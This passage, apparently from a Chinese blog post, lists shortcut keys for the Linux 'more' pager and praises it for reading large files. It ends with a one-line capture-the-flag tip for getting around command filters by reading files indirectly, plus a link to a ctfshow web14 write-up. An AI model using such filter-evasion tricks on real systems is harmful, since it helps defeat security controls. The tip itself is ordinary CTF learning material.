    n键：跳转到下一个匹配结果。
    g键：跳转到文件的开头。
    G键：跳转到文件的末尾。

总结

more 命令是 Linux 系统中一个简单而实用的文件查看工具，通过分页显示文件内容和提供快捷键操作，用户可以方便地查看大文件的内容，并进行文件内容的定位和搜索。无论是浏览日志文件、源代码文件还是其他大型文本文件，more 命令都是一个不可或缺的工具。

当命令过滤到无法执行的时候，不妨换种请求方式，寻求一个中间变量，然后用另一种方式读取 详细请看这个： <https://blog.csdn.net/wangyuxiang946/article/details/120252481?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522338EEF0B-1503-479D-9BCD-DA0EA7DD843C%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=338EEF0B-1503-479D-9BCD-DA0EA7DD843C&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120252481-null-null.142^v100^pc_search_result_base6&utm_term=ctfshow%20%E8%90%8C%E6%96%B0%20web14&spm=1018.2226.3001.4187>
